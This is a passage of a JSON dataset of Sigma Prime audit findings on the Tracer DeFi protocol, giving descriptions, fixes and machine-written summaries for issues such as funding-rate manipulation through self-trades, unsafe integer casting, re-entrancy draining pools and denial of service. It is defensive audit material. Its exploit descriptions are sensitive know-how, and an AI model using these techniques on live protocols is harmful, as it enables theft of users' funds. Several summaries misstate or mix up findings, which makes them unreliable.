steps three (3) and\nfour (4).\nThe impact of this attack is that users are able to artificially increase their base. By creating numerous accounts\nand applying this attack multiple times an attacker would be able to withdraw all of the funds in the protocol.\nRecommendations\nThe funding rate needs to ensure that the net impact on the sum of users base is zero. One method for doing\nthis is applying the global rate directly to the amount in the trade without using user specific rates or user specific\nquotes, this will ensure that the change in base of both users will be the same absolute value but opposite in\nsign.\nPage | 10\nTracer Protocol Detailed Findings\nTCR-04 claimReceipts() market Parameter is Unchecked",
      "summary": "\nThe funding rate is a time-weighted average difference between the oracle price and the market price. It is used to reward or tax users depending on the difference between the two prices and their position. It was discovered that users can manipulate their funding rate index to potentially earn rewards or avoid fees. This is done by taking the following steps: depositing an amount, making a trade of negligible size, and then closing the position. This attack can be applied if the currentGlobalRate is less than 0 by switching the long and short users in the third and fourth steps. The impact of this attack is that users are able to artificially increase their base. This can lead to the attacker withdrawing all of the funds in the protocol. \n\nTo fix this issue, the funding rate needs to be adjusted so that the net impact on the sum of users base is zero. One method for doing this is applying the global rate directly to the amount in the trade without using user specific rates or user specific quotes. Additionally, the market parameter should be checked to ensure that it is not being manipulated.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19724",
      "title": "Funding Rate Manipulation #1",
      "impact": "HIGH",
      "content": "Description\nThe function Pricing.updatePrice() is called whenever a trade is made. This is used to store hourly price\nvalues which are used in the calculations of the funding rate.\nUsers are able to manipulate this value by making trades with themselves (i.e. taking both the long and short for\na trade), which will have a net zero impact on their position.\nThe malicious user may make numerous trades with prices exponentially higher or lower than the underlying\nprice. This will essentially allow them to set the derivative price and thus the funding rate to one of their choice.\nA similar funding rate manipulation can occur by using two different accounts and making pairs of trades each\nwith opposite positions. e.g.\nOrder1 - UserA short, UserB long: 0.000001@10,000,000,000\nOrder2 - UserA long, UserB short: 0.000001@10,000,000,000\nA similar technique can be used to manipulate the average price when liquidating an order. This can be used to\ndrain the insurance pool.\nRecommendations\nOn chain Time-Weighted-Average-Price (TWAP) systems can easily be manipulated if users can make trades at\narbitrary prices. To use a TWAP orders must exist in a priority queue and orders be settled for the best price\nfirst. Therefore if a user wishes to execute an order at a very high or low price they would have to execute all\norders which have a better price first.\nThis will still have limitations if there is low liquidity as users would be able to trade through the order book to\nthen execute transactions at the desired price. Furthermore, the order book is empty when the contract is first\ndeployed and so a malicious user may apply this attack.\nPage | 8\nTracer Protocol Detailed Findings\nTCR-03 Funding Rate Manipulation #2",
      "summary": "\nThe function Pricing.updatePrice() is used to store hourly price values which are used in the calculations of the funding rate. Malicious users can manipulate this value by making trades with themselves or different accounts with opposite positions, with prices exponentially higher or lower than the underlying price. This allows them to set the derivative price and thus the funding rate to one of their choice. It can also be used to manipulate the average price when liquidating an order, which can be used to drain the insurance pool. To prevent this, on-chain Time-Weighted-Average-Price (TWAP) systems should be used. These require orders to exist in a priority queue and orders be settled for the best price first. This will still have limitations if there is low liquidity, as users can still trade through the order book to execute transactions at the desired price. Furthermore, the order book is empty when the contract is first deployed and so a malicious user may apply this attack.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19723",
      "title": "Unsafe Casting of int256 touint256",
      "impact": "HIGH",
      "content": "Description\nIn the functions permissionedTakeOrder() and matchOrders() , the order price is cast to a uint256 to\ncalculate the base change, as seen in the following line.\nint256 baseChange = ( fillAmount . mul ( uint256 ( order . price ))). div ( priceMultiplier ). toInt256 ();\nIt is a valid use case to have price as a negative number. Solidity uses 2s compliment hence when casting a\nnegative int256 to a uint256 the result will be greater than 2255, since the first bit of a negative int256 will\nalways be set to one (1).\nThe impact in Tracer is that the baseChange will be significantly overstated and will contain the wrong sign.\nA malicious user could positively move their base , for a trade that should move their base in the opposite\ndirection.\nThe inverse would occur to the user who took the other side, negatively impacting their base.\nThis would signficantly increase the margin for the user whos base moved in the positive direction allowing them\nto withdraw large sums of the base token.\nAdditionally there is the requirement, require(baseChange > 0, \"TCR: Margin change <= 0\") which should\nnot hold true for negatively priced orders.\nAnother case of incorrect casting is in Tracer.sol:L156 , namely, in the price and gas oracle contracts.\nTracer.sol:permissionedMakeOrder() attempts to place an on-chain order and queries an instance of\nGasOracle.sol to receive the off-chain gas cost. GasOracle.sol:latestAnswer() calculates the gas cost\nin terms of the underlying market asset price. However, it is not equipped to handle negative prices and will\ntherefore return a negative gas cost which is later cast from int256 touint256 . As a result, orders will likely\nnot be made as accounts will fail the marginIsValid() check in Tracer.sol:L198 .\nRecommendations\nWe recommend that the calculations for baseChange are all executed as int256 rather than uint256 . Addi-\ntionally, the statement require(baseChange > 0, \"TCR: Margin change <= 0\") should be removed.\nWe also recommend that GasOracle.sol queries the absolute value of the price oracle instead of an int256\nvalue.\nPage | 7\nTracer Protocol Detailed Findings\nTCR-02 Funding Rate Manipulation #1",
      "summary": "\nThis bug report is about two functions in the Tracer Protocol, permissionedTakeOrder() and matchOrders(), where the order price is cast to a uint256 to calculate the base change. It is a valid use case to have price as a negative number, however, when casting a negative int256 to a uint256 the result will be greater than 2255. This bug has two impacts. Firstly, the baseChange will be significantly overstated and will contain the wrong sign. Secondly, the margin for the user whose base moved in the positive direction will be increased, allowing them to withdraw large sums of the base token. Additionally, the statement require(baseChange > 0, \"TCR: Margin change <= 0\") should not hold true for negatively priced orders. Another case of incorrect casting is in the price and gas oracle contracts. \n\nThe recommendation is to execute all calculations for baseChange as int256 rather than uint256 and to remove the statement require(baseChange > 0, \"TCR: Margin change <= 0\"). Additionally, it is advised to query the absolute value of the price oracle instead of an int256 value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19722",
      "title": "Miscellaneous Gas Optimisations",
      "impact": "LOW",
      "content": "## Description\n\nThis section describes general observations made by the testing team in which contract callers are able to generate gas savings:\n\n## 1. Repeated Checks or Operations:\n- In `PoolSwapLibrary.sol`, the function `getMintWithBurns()` contains a zero check for price. However, this zero check is then repeated by `getMint()` and `getBurn` on the same variable meaning the first check on line [466] can be safely removed.\n- On line [141] of `KeeperRewards.sol`, we make an unnecessary casting of `_settlementTokenPrice` to a `uint256` when it is already a `uint256`.\n- On line [93] of `SMAOracle.sol`, the require statement is unnecessary as in Solidity 0.8.7, line [95] will revert in the event that `inputOracleDecimals > decimals`.\n- The incrementation `i++` on line [185] of `SMAOracle.sol` can be placed inside an unchecked block at the end of the loop to save gas as its value is bounded by `periodCount` and so cannot overflow.\n- On line [756] of `implementation/PoolCommitter.sol`, we delete `unAggregatedCommitments[user]` however this is overwritten on the next line. Due to how Solidity handles overwriting with dynamic length arrays, the delete operation is unneeded.\n- The `KeeperRewards.payKeeper()` function will poll the settlement token oracle before retrieving its price. However, this can be optimized by utilizing the result of the `IOracleWrapper.poll()` call which will return the SMA if `SMAOracle.sol` is used. If it is expected that both `SMAOracle.sol` and `ChainlinkOracleWrapper.sol` may function as the oracle endpoint, then it may be useful to remove the `SMAOracle._calculateSMA()` call in `SMAOracle.poll()` and avoid returning the unused `int256`.\n\n## 2. Unused Memory Copy of Storage Variable:\nSeveral times values are written to local variables which are then only used to write the same value to a storage variable. A small gas saving can be had by directly writing to storage in these instances.\n- On line [194] of `LeveragedPool.sol`, we introduce local variables `shortBalanceAfterRewards` and `longBalanceAfterRewards` however these are only used to write to the storage variables `shortBalance` and `longBalance` and so can be removed.\n- On line [66] of `AutoClaim.sol`, we store the outcome of `poolCommitter.getAppropriateUpdateIntervalId()` in a local variable which is then just written to storage on line [67], the local variable is then never read again and so the outcome could just be directly written to storage instead.\n\n## 3. Event Emission Reordering:\nThe functions `updateFeeAddress()`, `updateSecondaryFeeAddress()`, `setKeeper()`, and `claimGovernance()` of `LeveragedPool.sol` and `claimGovernance()` of `PoolFactory.sol` could all move the event emission prior to overwriting of their related storage variable to avoid also needing a local variable. While this breaks the \"Checks, Effects, and Interactions\" coding pattern advice, in these instances not following the CEI pattern poses no additional risk.\n\n## 4. Conditional Minimal Value Setting:\nIn several cases we aim to set a variable `x` to `Min(x,y)` for two `uint256` values `x` and `y`. This can be done more efficiently using a bitwise AND operation as then larger bits are discarded.\n- In `KeeperRewards.sol` on lines [159-163], the `if` clause can be replaced with `return (keeperTipAmount & MAX_TIP);` to save about 50 gas.\n- Similarly, in `PoolCommitter.sol`, the conditional operator on line [708] can be replaced with `update._maxIterations = uint8(unAggregatedLength) & MAX_ITERATIONS;`. This has exactly the same behaviour but can save up to 16,900 gas for a 46% reduction.\n- In `SMAOracle.sol` on lines [180-181], the `if` statement can be replaced by `k = k & numPeriods` for a saving of 2,244 gas or about 10%.\n\n## 5. Storage Accesses Can Be Replaced By Memory Operations:\nIn `SMAOracle.sol` on line [185], we use a global variable `periodCount` twice in a loop. `periodCount` should be stored in a local variable prior to beginning the loop and this should be accessed instead to avoid unnecessary SLOAD operations.\n\n## 6. Variables Can Be Made Immutable For Gas Savings:\nBoth the string `adminRoleDescription` and `bytes32 adminRoleDescriptionHash` variables can utilize the `immutable` keyword to generate small gas savings.\n\n## 7. Stale Code:\n- On line [13] of `SMAOracle.sol`, we use `PRBMathSD58x18` however this librarys functions are never actually used and so can be removed.\n- In `CalldataLogic.sol`, the constants `SLOT_LENGTH`, `FUNCTION_SIGNATURE_LENGTH`, `SINGLE_ARRAY_OFFSET`, and `DOUBLE_ARRAY_OFFSET` are never used in this library nor imported by any other contracts and so should be removed.\n- The function `transferOwnership()` of `vendors/ERC20_Cloneable.sol` is only callable by `PoolFactory` but is never called. Either this function should be removed or its use implemented somewhere in `PoolFactory`.\n\n## 8. Functions Can Be Made External For Gas Savings:\nIn `PoolCommitter.sol`, the functions `getMintingFee()` and `getBurningFee()` can be marked as external functions as neither are called internally by any other functions of `PoolCommitter.sol`. This will generate gas savings on contract deployment and on each function call.\n\n## 9. Function Rewrites:\nSeveral functions can have sections altered to reduce gas costs without altering their outcomes.\n- In `SMAOracle.sol`, we calculate the sum of the last `k` prices on each call. This requires up to 24 (the maximum value of `numPeriods`) variables be loaded from storage each time. Instead, you could store the sum and simply remove the oldest price and add on the newest price to update the sum on each call. Then every call after the first full average calculation would then require only 3 variables be loaded from storage and would likewise reduce the number of addition operations needed.\n- In `SMAOracle.sol`, if we store the variables `_numPeriods`, `numPeriods`, and `periodCount` as signed integers, then we dont need to cast `k` from `uint256` to `int256` on line [190]. `_numPeriods` and `numPeriods` have their given value capped by `MAX_PERIOD`, and if `periodCount` represents seconds, then even as an `int256` it can store values expressing over 1.83  10^69 years.\n- In `implementation/LeveragedPool.sol` on line [274], we pack the inputted price change data into a structure before then handing it to `PoolSwapLibrary.calculatePriceChange()` on line [287]. Once there it is then unpacked and saved to local variables. This process isnt useful and just adds to the gas costs.\n\n## 10. Temporary Storage Variables Can Be Deleted:\n`PoolFactory.claimGovernance()` and `LeveragedPool.claimGovernance()` can delete the storage variable `provisionalGovernance` for an additional gas refund. However, it might make sense to keep the slot warm as it reduces any subsequent call to `transferGovernance()`.\n\n## 11. Inline Code Optimisations:\nLines [111] and [113] of `PoolKeeper.performUpkeepSinglePool()` can be combined such that we do not load an external call into memory and then read from memory. Instead, the external call can be read directly.\n\n## Recommendations\nEnsure that the comments are understood and acknowledged, and consider implementing the suggestions above.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19720",
      "title": "Upkeeps May be Performed on Stale Oracle Data",
      "impact": "LOW",
      "content": "## Description\n\nUpkeeps can be performed by any user, incentivized through payouts in the form of the pools settlement token. Oracles are utilised when updating the price of the underlying asset. A call to `IOracleWrapper.poll()` is made to ensure the data is fresh. However, due to the use of try/catch statements, poll actions may fail silently, leading to further execution of the upkeep on stale data.\n\n## Recommendations\n\nEnsure it is understood that failed poll actions will result in the use of potentially stale oracle data when performing an upkeep.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19719",
      "title": "newPool() Does Not Handle Failed Polls",
      "impact": "LOW",
      "content": "## Description\n\nThe `newPool()` function is called when a pool is created by the `PoolFactory.sol` contract. This initializes the first price used to perform value transfers between pool sides. In order to prevent arbitragers front-running price updates, it is essential that fresh data be used in this function.\n\n## Recommendations\n\nConsider using a `try/catch` statement (with appropriate event emission) when polling the oracle. This is evident in the `performUpkeepSinglePool()` function. This will ensure the first price provided by the oracle is not stale. However, it may be intended for `IOracleWrapper.poll()` to revert without error handling. This prevents the `PoolFactory.sol` contract from deploying pools incorrectly.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19718",
      "title": "Inconsistent Implementation of Fees",
      "impact": "LOW",
      "content": "## Description\nThere are two types of fees in `LeveragedPool.sol`: fees charged on the entire leveraged pool, and the fee percentages used to determine how much of the fee to allocate to the primary and secondary accounts. The first fee type uses ABDK decimals to maximize the degree of precision; however, when splitting this fee between the primary and secondary accounts, ABDK decimals is not used and instead simple division is employed, which ultimately leads to some truncation.\n\n## Recommendations\nConsider opting to use ABDK decimals for all fee calculations or ensure that it is understood that there will be a small degree of truncation when allocating fees to the respective accounts.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19717",
      "title": "Rewards Paid to Keeper Never Emitted in Events",
      "impact": "LOW",
      "content": "## Description\nThe reward paid to a keeper who has called functions for the contract is calculated and returned by `KeeperRewards.payKeeper()`. However, this reward value is never recorded by the function `performUpkeepSinglePool()`. This means when the events `KeeperPaid` or `KeeperPaymentError` are emitted, they will always log the reward as zero.\n\n## Recommendations\nThe intended reward variable was introduced on line [141]. The output of `KeeperRewards.payKeeper()` on line [144] should be saved to this variable so that the events emit the accurate reward value.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19716",
      "title": "Event Emission Always Records Zero Quantity",
      "impact": "LOW",
      "content": "## Description\n\nPool users can elect to let another user initiate their minting or burning of settlement tokens on their behalf. If they do so, they can incentivize this to occur by adding an ETH reward that goes to the caller.\n\nIn `madePaidClaimRequest()`, the situation where a caller can initiate their own action and reclaim the reward in the process is handled. Then on line [55], this process is recorded by the event `PaidRequestExecution`. However, in recording this, we use the deleted storage structure meaning that the amount value recorded will always be zero.\n\n## Recommendations\n\nReplace the use of `request.reward` with the local variable `copy reward` so that the event information is correct.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19715",
      "title": "First Committer of a New Pool Can Avoid Paying Fees",
      "impact": "LOW",
      "content": "## Description\n\nCurrently, mint commits will allocate the fee to the same side of the pool that the commit is executed on. However, because the committer is the only token holder, they will actually receive all fees generated on their own commit. This is a viable method for users to gain a position within a newly created pool without incurring any fee for this action.\n\n## Recommendations\n\nEnsure this is understood by users if this is used as an incentive to bootstrap new leveraged pools.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19714",
      "title": "payKeeper() Does Not Properly Handle Errors",
      "impact": "LOW",
      "content": "## Description\nTry/catch statements are useful when we want to ensure a function handles errors without reverting. In this case, `payKeeper()` will revert if `IOracleWrapper.getPrice()` fails to correctly query the price from the oracle. As a result, `payKeeper()` may revert on this specific edge case, causing the protocol to suffer a period of downtime until the oracle functions properly again.\n\n## Recommendations\nConsider using a fallback oracle or properly handle the case where the settlement token oracle does not function accordingly. Because `payKeeper()` is a sensitive function used to incentivize upkeeps, it is important that this never reverts as it impacts the overall availability of the protocol.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19713",
      "title": "Unsafe Casting of settlementTokenPrice",
      "impact": "LOW",
      "content": "## Description\nThe `payKeeper()` function performs an unsafe cast of the `settlementTokenPrice` variable. This may lead to an unlikely edge case where arithmetic underflows are not properly handled by the protocol.\n\n## Recommendations\nConsider performing safe casting wherever possible. OpenZeppelin provides a useful `SafeCast` library which should provide the appropriate checks.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19712",
      "title": "Keepers Will be Underpaid in a Post-Merge Ethereum Environment",
      "impact": "LOW",
      "content": "## Description\n\nThe keeper tip amount will not prove accurate in a post-merge Ethereum environment as block times will drastically change. As a result, keepers will actually be underpaid due to the lowered per-block increase that is provided to keepers as an incentive to perform upkeeps on the perpetual pools protocol.\n\n## Recommendations\n\nConsider allowing Tracer DAOs governance to update this parameter such that leveraged pools can be unaffected by the merge of the consensus and execution layers.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19711",
      "title": "Invariant Checking Does Not Enforce a Paused PoolCommitter Contract",
      "impact": "LOW",
      "content": "## Description\n\nThe pause mechanism is to be used only when the protocol does not function as intended, whether that be due to a bug or hack. When the balance invariants in `InvariantCheck.sol` do not hold true, the `PoolCommitter.sol` and `LeveragedPool.sol` contracts are paused. However, there is no enforcement of this pause mechanism in `PoolCommitter.sol`. As a result, it may still be possible to withdraw a users claim request amount if there is no pending balance to transfer to the user. It may also be possible for users to claim via the `AutoClaim.sol` contract.\n\n## Recommendations\n\nConsider adding the `onlyUnpaused` modifier to the `claim()` function or removing any reference of this mechanism in `PoolCommitter.sol` if this is intended behaviour.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19710",
      "title": "Arithmetic Operation May Unintentionally Revert When Calculating Keeper Reward",
      "impact": "LOW",
      "content": "## Description\n\nThe pools upkeep is maintained by keepers; these are external actors who are incentivized to call pool functions by a reward that is then paid back to them. When calculating this reward, a check is done to verify that the pool has sufficient tokens to pay out the reward in settlement tokens, effectively checking:\n\n```\nreward <= _shortBalance + _longBalance\n```\n\nbefore proceeding to calculate and pay out the reward to the keeper. However, when:\n\n```\nreward = _shortBalance + _longBalance\n```\n\nthe calculation in `PoolSwapLibrary.getBalanceAfterFees()` will revert. This means that keeper actions may occasionally fail when the call should succeed.\n\n## Recommendations\n\nAmending the inequality on line [190] from:\n\n```\namount > _shortBalance + _longBalance\n```\n\nto \n\n```\namount >= _shortBalance + _longBalance\n```\n\nwill prevent this situation from occurring. Now, when the reward is exactly the same as `_shortBalance + _longBalance`, the code will return false.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19709",
      "title": "Change Interval Can be Arbitrarily Set by The Fee Controller to Brick The Leveraged Pool",
      "impact": "MEDIUM",
      "content": "## Description\n\nThe `changeInterval` dictates how much the `mintingFee` should move in the positive or negative direction. This is dependent on `longTokenPrice * shortTokenPrice`. The fee controller can call `setChangeInterval()` at any time to set the `changeInterval` to any arbitrary `uint256` value. \n\nAs a result, if we set this to the maximum `uint256` value, this may cause `updateMintingFee()` to revert if `PoolSwapLibrary.addBytes()` overflows and returns an invalid `bytes16` result. If `PoolSwapLibrary.compareDecimals()` utilizes an invalid `bytes16` input, the comparison will revert, inhibiting the execution of `executeAllCommitments()`. This inevitably leads to a continuous Denial-of-Service condition on any upkeep action.\n\n## Recommendations\n\nConsider restricting `setChangeInterval()` to values less than `PoolSwapLibrary.MAX_MINTING_FEE`.",
      "summary": "\nThis bug report is about an issue with the PoolSwapLibrary.addBytes() operation in the Perpetual Pools Updates Detailed Findings. The problem occurs when the changeInterval is set to the maximum uint256 value, which may cause the updateMintingFee() to revert if the PoolSwapLibrary.addBytes() operation overflows and returns an invalid bytes16 result. This can lead to a continuous Denial-of-Service condition on any upkeep action. The recommendation is to restrict the setChangeInterval() to values less than PoolSwapLibrary.MAX_MINTING_FEE.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19708",
      "title": "Secondary Fee Address Can Deny Pool Upkeeps by Reverting Upon Callback",
      "impact": "MEDIUM",
      "content": "## Description\n\nPool keepers will perform upkeeps on each given update interval, ensuring that pools use the most up-to-date pricing for rebalance events. Upon upkeep, a fee is charged on the pools short and long balances, used to allocate settlement tokens to the primary and secondary fee addresses.\n\nThe `executePriceChange()` function will ultimately pay fees through the `feeTransfer()` function. The settlement token is transferred according to the fee split percent. Because transfers are made during the upkeep of the pool, tokens supporting callbacks (native to ERC777 standard tokens) will allow the secondary fee account to take control over the path of execution, allowing them to forcefully revert the upkeep.\n\n## Recommendations\n\nThis has the potential to open up a Denial-of-Service vector, which can be mitigated by preventing all untrusted external calls. This can be done by removing the use of `safeTransfer()` in `feeTransfer()` and instead forcing the fee recipients to claim their fees in a separate transaction.",
      "summary": "\nThe bug report states that there is a potential Denial-of-Service vector in the executePriceChange() function which can be mitigated by preventing any untrusted external calls. It also states that the TPP-09 Change Interval Can be Arbitrarily Set by The Fee Controller to Brick The Leveraged Pool. \n\nThe TPP-08 Update Timestamps For SMAOracle And LeveragedPool May Diverge Due to a Backlog of Update Intervals bug report states that the protocol can handle up to 16 backlogged update intervals on each upkeep. This means that the lastPriceTimestamp in LeveragedPool.sol and lastUpdate in SMAOracle.sol may diverge, allowing a user to commit to a price outcome that is favourable to them. The report recommends restricting calls to SMAOracle.poll() such that they must originate from the PoolKeeper.sol or KeeperRewards.sol contracts.\n\nIn conclusion, the bug reports describe two potential Denial-of-Service vectors that can be mitigated through preventing untrusted external calls and restricting calls to SMAOracle.poll().",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19707",
      "title": "Stale Update Intervals Will Receive Burn Fees From Recent Update Intervals",
      "impact": "MEDIUM",
      "content": "## Description\n\nLeveraged pools function through constant upkeeps on each new update interval. An upkeep consists of three distinct operations:\n\n- **Price change execution** (incorporating a value transfer between the long and short sides of the pool).\n- **Transfer of fees** to the relevant addresses as part of the maintenance fee.\n- **Application of commitments** to the leveraged pool.\n\nWhen a user commits to mint tokens, the tokens and fee are instantly paid by the user; however, the relevant tokens are not minted until the next upkeep (assuming the user commits before the front-running interval). A burn commit does not follow the same method. Instead, tokens are burnt instantly; however, the tokens and fee are not calculated until the commit has been executed.\n\nAs a result, fees generated through mint commits will be instantly applied to the same side of the pool, but burn commits will only distribute fees once an upkeep has been performed. If we consider the backlog of unexecuted commitments to be greater than one, then the distribution of fees isnt entirely accurate. Lets consider the following example:\n\n- We will start with two assumptions. The mint and burn fees are both set to 10% and 100 settlement tokens is equal to 100 long or short tokens.\n- Alice commits to mint 100 long tokens on the first update interval. Consequently, 10 long tokens are distributed to other long token holders.\n- Bob commits to mint 100 long tokens on the same update interval as Alice. 10 long tokens are distributed to other long token holders.\n- The update interval advances to the second interval and the first update interval is upkept by a keeper.\n- Alice commits to burn her 90 long tokens on the second update interval.\n- Another update interval passes such that the second update interval is unexecuted.\n- Bob commits to burn his 90 long tokens on the third update interval.\n- The third update interval passes without being upkept. Hence, the second and third update intervals are unexecuted and will both be executed on the next upkeep.\n- Carol commits to mint 100 long tokens in which the mint fee is distributed instantly.\n- A keeper performs an upkeep on the backlogged commitments; however, because Carol has already paid her fees to the pool, Alice and Bob will still benefit by receiving a portion of fees paid by Carol.\n\nAs shown above, users could receive slightly more tokens if mint commits were made on update intervals following their burn commit and before their execution.\n\n## Recommendations\n\nConsider utilizing some sort of balance history to showcase the `longBalance` and `shortBalance` of each update interval. This will ensure the `priceHistory` mapping holds the most correct values, unimpacted by mint commits in future update intervals.",
      "summary": "\nThis bug report is about the Leveraged pools function in the Perpetual Pools Updates. When a user commits to mint tokens, the tokens and fee are instantly paid by the user, however, the tokens are not minted until the next upkeep. If a user commits to burn tokens, the tokens are burnt instantly, but the fees are not calculated until the commit is executed. This can lead to an inaccurate distribution of fees if there is a backlog of unexecuted commitments. For example, if Alice and Bob both commit to mint tokens on the same update interval and Alice commits to burn tokens on the next interval, but the next interval is not upkept, Alice and Bob will still benefit from the fees paid by Carol who committed to mint tokens on the third interval. \n\nIn order to solve this issue, the report recommends utilizing a balance history to showcase the longBalance and shortBalance of each update interval. This will ensure that the priceHistory mapping holds the most correct values, unimpacted by mint commits in future update intervals. Additionally, Secondary Fee Address can Deny Pool Upkeeps by Reverting Upon Callback.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19706",
      "title": "Pool Keepers Can Re-Enter poolUpkeep() if Tokens With Callbacks Are Used",
      "impact": "HIGH",
      "content": "## Description\nPool upkeeps are performed on each update interval by the protocols keepers. The `poolUpkeep()` function will check if the pools update interval has passed before executing a price change. However, because this function does not implement the checks-effects-interactions pattern, it is possible to re-enter the function and satisfy the `intervalPassed()` check again.\n\nIf we assume that the settlement token may contain a callback on transfers (typical for ERC777 standard tokens), the secondary fee account can re-enter `poolUpkeep()` and receive fees again. This can be repeated to effectively drain the leveraged pool of its funds.\n\n## Recommendations\n- Ensure that `lastPriceTimestamp` is updated before fees are transferred to the primary and secondary fee addresses.\n- Alternatively, it may be simpler to leave the implementation as is and instead modify the `feeTransfer()` function (referenced in `executePriceChange()`) to allocate funds to the fee addresses. This forces the secondary fee address to claim their fees instead, preventing them from taking control over the path of execution.",
      "summary": "\nThis bug report is about the Pool Upkeeps function of the protocol which checks if the pool's update interval has passed before executing a price change. The bug is that if the settlement token contains a callback on transfers, the secondary fee account can enter the Pool Upkeeps function and receive fees again, which can be repeated to drain the leveraged pool of its funds. \n\nThe recommendation is to update the lastPriceTimestamp before transferring fees to the primary and secondary fee addresses. Alternatively, it is suggested to modify the feeTransfer() function to allocate funds to the fee addresses, which will prevent the secondary fee address from taking control over the path of execution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-3/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
